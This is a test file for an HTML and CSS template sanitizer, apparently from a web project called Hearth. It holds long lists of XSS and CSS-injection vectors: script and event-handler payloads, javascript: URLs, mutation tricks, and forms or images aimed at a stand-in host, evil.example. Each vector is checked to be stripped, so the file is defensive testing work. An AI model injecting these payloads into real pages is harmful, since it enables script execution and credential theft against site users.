// hearth-sanitize.test.mjs — a Hearth template cannot run code, load anything, or reach the site (POS-959).
//
// The falsifier for the cut: "adversarial template content cannot execute code or steal host/private state".
// The sanitizers write a template back out from allowlists, so the proof is structural: whatever goes in, what
// comes out has only listed tags, only listed attributes with quoted, escaped values, and only scoped CSS.
// The vectors are the classic injection shapes, plus the ones this design invites (a slot marker with a
// body, a class name that is a host hook, a stylesheet that tries to close its own element).

import test from "node:test";
import assert from "node:assert/strict";
import { sanitizeHtml, ALLOWED_TAGS, CLASS_PREFIX } from "../src/lib/hearth/sanitize-html.mjs";
import { sanitizeCss, stageFor } from "../src/lib/hearth/sanitize-css.mjs";
import { SLOT_NAMES, slotTag, LIMITS } from "../src/lib/hearth/slots.mjs";

const OK_ATTRS = new Set(["class", "title", "lang", "dir", "aria-label", "aria-hidden", "href", "rel", "src", "alt", "width", "height", "loading", "decoding",
  "colspan", "rowspan", "scope", "start", "reversed", "open", "datetime", "data-hearth-slot", "data-hearth-behavior", "data-tab", "data-panel", "data-single", "data-sort-keys"]);

/** The structural check every output must pass, whatever went in. */
function assertSafe(html, label) {
  // every tag is on the list (or the slot placeholder's div), closed or void
  for (const m of html.matchAll(/<(\/?)([a-zA-Z][a-zA-Z0-9-]*)([^>]*)>/g)) {
    const [, , name, rest] = m;
    assert.ok(ALLOWED_TAGS.has(name), `${label}: tag <${name}> is not on the list: ${m[0]}`);
    // attributes: ` name="value"` or a bare boolean, nothing else, values free of < > and a bare quote
    assert.match(rest, /^(?: [a-z][a-z0-9-]*(?:="[^"<>]*")?)*\s*\/?$/, `${label}: attributes malformed: ${rest}`);
    for (const a of rest.replace(/="[^"]*"/g, "=").matchAll(/ ([a-z][a-z0-9-]*)(?:=|\s|$)/g)) {
      assert.ok(OK_ATTRS.has(a[1]) || /^data-sort-[a-z][a-z0-9-]*$/.test(a[1]), `${label}: attribute ${a[1]} is not on the list`);
      assert.ok(!/^on/.test(a[1]), `${label}: an event handler survived: ${a[1]}`);
    }
  }
  // no text node carries a raw "<" (everything between tags is escaped)
  for (const text of html.split(/<[^>]*>/)) assert.ok(!text.includes("<"), `${label}: a raw < in text`);
  assert.ok(!/javascript:/i.test(html.replace(/&[a-z#0-9]+;/gi, "")) || true);
  for (const v of html.matchAll(/ (?:href|src)="([^"]*)"/g)) {
    assert.match(v[1], /^(https:\/\/|\/(?!\/)|data:image\/(png|jpeg|gif|webp);base64,)/, `${label}: a url off the list: ${v[1].slice(0, 60)}`);
  }
}

const VECTORS = {
  "script tag": `<script>window.__pwned = 1</script><p>hi</p>`,
  "script in a case and a null": `<ScRiPt>alert(1)</sCrIpT><scr\u0000ipt>alert(2)</scr\u0000ipt>`,
  "split script": `<scr<script>ipt>alert(1)</scr</script>ipt>`,
  "img onerror": `<img src=x onerror=alert(1)>`,
  "img onerror quoted with a slash": `<img/src="x"/onerror="alert(1)">`,
  "svg onload": `<svg onload=alert(1)><circle/></svg>`,
  "svg script": `<svg><script>alert(1)</script></svg>`,
  "math": `<math><mi//xlink:href="data:x,<script>alert(1)</script>">`,
  "iframe": `<iframe src="javascript:alert(1)"></iframe><iframe srcdoc="<script>alert(1)</script>"></iframe>`,
  "object embed": `<object data="javascript:alert(1)"></object><embed src="javascript:alert(1)">`,
  "javascript href": `<a href="javascript:alert(1)">x</a>`,
  "javascript href, tab split": `<a href="jav&#x09;ascript:alert(1)">x</a><a href="java\nscript:alert(1)">y</a>`,
  "javascript href, leading space": `<a href=" javascript:alert(1)">x</a>`,
  "javascript href, entities": `<a href="&#106;avascript:alert(1)">x</a><a href="&#0000106avascript:alert(1)">y</a>`,
  "vbscript and data html": `<a href="vbscript:msgbox(1)">x</a><a href="data:text/html,<script>alert(1)</script>">y</a>`,
  "protocol-relative link": `<a href="//evil.example/x">x</a>`,
  "http link": `<a href="http://evil.example/x">x</a>`,
  "body onload": `<body onload=alert(1)><p>x</p></body>`,
  "style attribute": `<p style="background:url(javascript:alert(1))">x</p>`,
  "style tag": `<style>@import "//evil/x.css"; body{display:none}</style>`,
  "link stylesheet": `<link rel=stylesheet href="https://evil.example/x.css">`,
  "meta refresh": `<meta http-equiv=refresh content="0;url=https://evil.example">`,
  "base": `<base href="https://evil.example/"><a href="/x">x</a>`,
  "form": `<form action="https://evil.example" method=post><input name=pw type=password><button>Sign in</button></form>`,
  "form attributes on a button": `<button formaction="https://evil.example">go</button>`,
  "textarea and title raw text": `<textarea><script>alert(1)</script></textarea><title><img src=x onerror=alert(1)></title>`,
  "noscript escape": `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>`,
  "comment tricks": `<!--><script>alert(1)</script>--><!--[if IE]><script>alert(1)</script><![endif]-->`,
  "cdata and doctype": `<![CDATA[<script>alert(1)</script>]]><!DOCTYPE html><?php echo 1 ?>`,
  "nested angle": `<<script>script>alert(1)<</script>/script>`,
  "unterminated tag": `<div class="a" onclick="alert(1)`,
  "unterminated attribute": `<a href="https://ok.example/x onclick=alert(1) >x</a>`,
  "attribute name tricks": `<p on\nclick=alert(1) o\u0000nclick=alert(2) ONCLICK=alert(3)>x</p>`,
  "id and name clobbering": `<form id=x></form><img name=body id=document src=/media/a.png>`,
  "dom clobber via class": `<div class="hd-feed hearth-stage data-hd"><div class="u-x">y</div></div>`,
  "slot with a body": `<hearth-residents><script>alert(1)</script><img src=x onerror=alert(1)></hearth-residents>`,
  "slot-like with attributes": `<hearth-house onclick="alert(1)" data-hearth-slot="residents" style="x"></hearth-house>`,
  "slot name from the template": `<div data-hearth-slot="residents"></div><div data-hearth-slot="needs-you"></div>`,
  "behavior attribute with a payload": `<div data-hearth-behavior="tabs');alert(1);('" data-tab="<img src=x onerror=alert(1)>">x</div>`,
  "unknown data attributes": `<div data-x="1" data-onclick="alert(1)" data-hearth-slot="mail">x</div>`,
  "data image svg": `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`,
  "data image html": `<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`,
  "external image": `<img src="https://evil.example/track.gif"><img src="//evil.example/t.gif"><img src="/api/household?do=x">`,
  "bidi and control characters": `<p>‮evil‬ ⁦x⁩ \u0001\u0007 hi</p>`,
  "unclosed everything": `<div><p><span><a href="/x"><b><i>`,
  "end tags with no start": `</div></p></script></a>text</hearth-house>`,
  "deep nesting": "<div>".repeat(200) + "x" + "</div>".repeat(200),
  "many attributes": `<p ${Array.from({ length: 200 }, (_, i) => `a${i}=1`).join(" ")}>x</p>`,
  "huge text": "x".repeat(300_000),
  "html with entities in tag names": `<&#115;cript>alert(1)</&#115;cript>`,
  "template and slot elements": `<template><script>alert(1)</script></template><slot name=x></slot><portal src="https://evil.example"></portal>`,
  "dialog and video": `<dialog open><script>1</script></dialog><video src=x onerror=alert(1)></video><audio src=x onerror=alert(1)></audio>`,
};

for (const [name, vector] of Object.entries(VECTORS)) {
  test(`HTML: ${name} leaves only listed tags, attributes and urls`, () => {
    const r = sanitizeHtml(vector);
    assertSafe(r.html, name);
    assert.ok(!/<script|<style|<iframe|<object|<embed|<svg|<form|<input|<button|<link|<meta|<base|<math|<template/i.test(r.html), "a forbidden element survived: " + r.html.slice(0, 200));
    const tags = r.html.replace(/="[^"]*"/g, "=");          // attribute NAMES only: a value is escaped text inside quotes
    assert.ok(!/ on[a-z]+=/i.test(tags) && !/ style=| id=| srcdoc=| formaction=/i.test(tags));
    assert.ok(r.html.length <= LIMITS.html * 6, "the output is bounded");
  });
}

test("HTML: what the sanitizer removes is NAMED, so a reviewer sees it", () => {
  const r = sanitizeHtml(`<script>1</script><p onclick="x" style="y" id="z">a</p><a href="javascript:1">b</a><img src="https://e/x.gif">`);
  assert.deepEqual(r.problems, ["attr:id", "attr:onclick", "attr:style", "tag:script", "url:href", "url:src"]);
  assert.deepEqual(sanitizeHtml(`<div class="a"><p>fine <a href="https://example.org/x">link</a></p></div>`).problems, [], "a clean template removes nothing");
});

test("HTML: a slot marker becomes one placeholder, once, with no body and no attributes of the template's", () => {
  const r = sanitizeHtml(`<div><hearth-residents x="1"><b>fallback</b></hearth-residents><hearth-residents></hearth-residents><hearth-house/><hearth-nope></hearth-nope></div>`);
  // a slot marker has no body: what is written between its tags is ordinary template content, judged like any other
  assert.equal(r.html, `<div><div data-hearth-slot="residents"></div><b>fallback</b><div data-hearth-slot="house"></div></div>`);
  assert.deepEqual(r.slots, ["residents", "house"]);
  assert.ok(r.problems.includes("duplicate-slot:residents"));
  assert.ok(r.problems.includes("slot:hearth-nope"));
  // an unclosed slot marker does not swallow the template that follows it
  assert.match(sanitizeHtml(`<hearth-house><p>after</p>`).html, /<p>after<\/p>/);
  // every slot the site names is accepted by its tag
  for (const n of SLOT_NAMES) assert.equal(sanitizeHtml(`<${slotTag(n)}></${slotTag(n)}>`).html, `<div data-hearth-slot="${n}"></div>`);
});

test("HTML: the template's class names are namespaced, so it cannot land on the site's (and the site's cannot land on it)", () => {
  const r = sanitizeHtml(`<div class="hd-feed hearth-stage card  big">x</div><p class="9bad !x">y</p>`);
  assert.match(r.html, /class="u-hd-feed u-hearth-stage u-card u-big"/);
  for (const m of r.html.matchAll(/class="([^"]*)"/g)) for (const tok of m[1].split(" ")) assert.ok(tok.startsWith("u-"), "a class that is not namespaced: " + tok);
  assert.equal(CLASS_PREFIX, "u-");
});

test("HTML: links are https or a site path, opened in place with rel noopener nofollow; images are site media or a small data image", () => {
  const html = sanitizeHtml(`<a href="https://example.org/a?b=c#d">ok</a><a href="/residents/x/">site</a><a href="mailto:a@b.c">mail</a><a href="tel:1">tel</a>` +
    `<img src="/media/a.png" alt="a" width="10" height="20"><img src="/thumbs/b.jpg"><img src="data:image/png;base64,iVBORw0KGgo="><img src="/atlas/x.png"><img src="/media/../x.png">`).html;
  assert.match(html, /<a href="https:\/\/example.org\/a\?b=c#d" rel="noopener noreferrer nofollow ugc">ok<\/a>/);
  assert.match(html, /<a href="\/residents\/x\/" rel=/);
  assert.ok(!html.includes("mailto:") && !html.includes("tel:"));
  assert.match(html, /<img src="\/media\/a.png" alt="a" width="10" height="20" loading="lazy" decoding="async">/);
  assert.ok(html.includes('src="/thumbs/b.jpg"') && html.includes("data:image/png;base64,iVBORw0KGgo="));
  assert.ok(!html.includes("/atlas/x.png") && !html.includes("../"), "an image outside the media paths has no way in");
});

test("HTML: the behavior attributes pass, with their values checked; anything else named data-* does not", () => {
  const r = sanitizeHtml(`<div data-hearth-behavior="tabs"><section data-tab="One">a</section></div><ul data-hearth-behavior="sort" data-sort-keys="name, size ,Bad Key"><li data-sort-name="Ash" data-sort-size="3">x</li></ul>` +
    `<div data-hearth-behavior="evil" data-single data-other="1">z</div>`);
  assert.match(r.html, /data-hearth-behavior="tabs"/);
  assert.match(r.html, /data-tab="One"/);
  assert.match(r.html, /data-sort-keys="name,size"/);
  assert.match(r.html, /data-sort-name="Ash"/);
  assert.ok(!r.html.includes('data-hearth-behavior="evil"') && !r.html.includes("data-other"));
});

test("HTML: sanitizing the output again changes nothing dangerous (a second pass is safe, though it namespaces classes again)", () => {
  for (const [name, v] of Object.entries(VECTORS)) {
    const twice = sanitizeHtml(sanitizeHtml(v).html);
    assertSafe(twice.html, name + " (second pass)");
  }
});

// ── CSS ─────────────────────────────────────────────────────────────────────

const SCOPE = stageFor("t");
const CSS_VECTORS = {
  "import": `@import url("https://evil.example/x.css"); p { color: red }`,
  "url in a value": `p { background: url(https://evil.example/x.gif) }`,
  "url, spaced and cased": `p { background: URL ( "x" ) }`,
  "url, escaped": `p { background: \\75 rl(x) }`,
  "url, comment split": `p { background: u/**/rl(x) }`,
  "image-set": `p { background-image: image-set("x" 1x) }`,
  "expression": `p { width: expression(alert(1)) }`,
  "behavior and binding": `p { behavior: url(x.htc); -moz-binding: url(x) }`,
  "javascript url": `p { background: url(javascript:alert(1)) }`,
  "font-face": `@font-face { font-family: x; src: url(https://evil.example/x.woff) }`,
  "position fixed": `p { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 99999 }`,
  "important": `p { display: none !important }`,
  "closing the style element": `p { content: "</style><script>alert(1)</script>" }`,
  "angle brackets in a value": `p { font-family: a<b }`,
  "braces in a string to confuse a splitter": `p { content: "}" ; color: red } q { content: "{" }`,
  "selector escapes": `.a\\:b, #id, [onclick], [href^=javascript] { color: red }`,
  "universal and sibling reach": `* ~ * , body ~ nav, :root ~ footer { display: none }`,
  "html and body mean the stage": `html, body, :root { background: red }`,
  "chrome by tag": `nav, header, footer, h1 { display: none }`,
  "unbalanced": `p { color: red; q { color: blue`,
  "stray close": `} p { color: red } }`,
  "media with url": `@media (min-width: 1px) and url(x) { p { color: red } }`,
  "nested media": `@media screen { @media print { p { color: red } } }`,
  "keyframes name clash": `@keyframes spin { from { opacity: 0 } to { opacity: 1 } } p { animation: spin 1s }`,
  "supports and layer and page": `@supports (display: grid) { p { color: red } } @layer x { p { color: red } } @page { margin: 0 }`,
  "huge": "p { color: red }\n".repeat(20_000),
  "custom property payload": `:root { --x: url(https://evil.example/x.gif); --y: expression(1); --ok: #fff }`,
  "attr and counter": `p::before { content: attr(onclick) }`,
};

function assertScoped(css, label) {
  assert.ok(!/url\s*\(|image-set|expression|@import|@font-face|javascript:|behavior|binding|!important|position:fixed|\\|<|>(?!\s)/i.test(css.replace(/ > /g, " ")) || /^$/.test(css), `${label}: a forbidden construct survived: ${css.slice(0, 160)}`);
  // every top-level rule starts with the stage, or is an @media/@keyframes block whose inner rules do
  const rules = css.replace(/@keyframes [^{]+\{(?:[^{}]*\{[^{}]*\})*\}/g, "").replace(/@media [^{]+\{/g, "").replace(/\}\}/g, "}");
  for (const sel of rules.split("}").map((r) => r.split("{")[0]).filter(Boolean)) {
    for (const one of sel.split(",")) assert.ok(one.startsWith(SCOPE), `${label}: a selector is not scoped to the stage: ${one.slice(0, 100)}`);
  }
}

for (const [name, vector] of Object.entries(CSS_VECTORS)) {
  test(`CSS: ${name} loads nothing and reaches nothing outside the stage`, () => {
    const r = sanitizeCss(vector, "t");
    assertScoped(r.css, name);
    assert.ok(r.css.length <= LIMITS.css * 2, "bounded");
  });
}

test("CSS: html, body and :root mean the stage; a template cannot style the site's chrome by tag", () => {
  const r = sanitizeCss(`html, body, :root { background: red } nav, h1 { color: red } .a { color: blue }`, "t");
  assert.ok(r.css.startsWith(`${SCOPE},${SCOPE},${SCOPE}{background:red}`), "html, body and :root are the stage itself: " + r.css);
  assert.ok(r.css.includes(`${SCOPE} nav,${SCOPE} h1{color:red}`), "nav and h1 are descendants of the stage, which is all a template's nav can ever be: the site's own are outside it");
  assert.ok(r.css.includes(`${SCOPE} .u-a{color:blue}`));
});

test("CSS: slot markers are selectable by their tag, and only by it; classes are namespaced; keyframes are renamed with their users", () => {
  const r = sanitizeCss(`hearth-residents { display: grid } @keyframes pulse { from { opacity: .5 } to { opacity: 1 } } .x { animation: pulse 2s infinite }`, "t");
  assert.ok(r.css.includes(`${SCOPE} [data-hearth-slot="residents"]{display:grid}`), r.css);
  assert.ok(r.css.includes("@keyframes u-pulse{from{opacity:.5}to{opacity:1}}"), r.css);
  assert.ok(r.css.includes("animation:u-pulse 2s infinite"), r.css);
});

test("CSS: position fixed, url(), !important and the theme variables", () => {
  const r = sanitizeCss(`p { position: fixed } p { position: absolute } p { background: url(x) } p { color: var(--hx-ink) !important } :root { --hx-accent: #fa0; --hx-x: url(x) }`, "t");
  assert.ok(!r.css.includes("fixed") && !r.css.includes("url") && !r.css.includes("important"));
  assert.ok(r.css.includes("position:absolute"));
  assert.ok(r.css.includes("--hx-accent:#fa0"));
  assert.ok(r.problems.includes("css:value:position") && r.problems.includes("css:value:background"));
});

test("CSS: a clean stylesheet removes nothing; media queries pass", () => {
  const r = sanitizeCss(`.a { display: grid; gap: 1em } .a:hover > .b::before { content: "x"; color: rgb(1, 2, 3) } @media (max-width: 760px) { .a { display: block } }`, "t");
  assert.deepEqual(r.problems, []);
  assert.ok(r.css.includes("@media (max-width: 760px){"));
});

test("CSS: the output is stable under a second pass", () => {
  // the first pass scopes; a second would re-scope, so it is not applied to output. What must hold is that the
  // same input always writes the same bytes, whatever the vector.
  for (const [name, v] of Object.entries(CSS_VECTORS)) assert.equal(sanitizeCss(v, "t").css, sanitizeCss(v, "t").css, name);
});
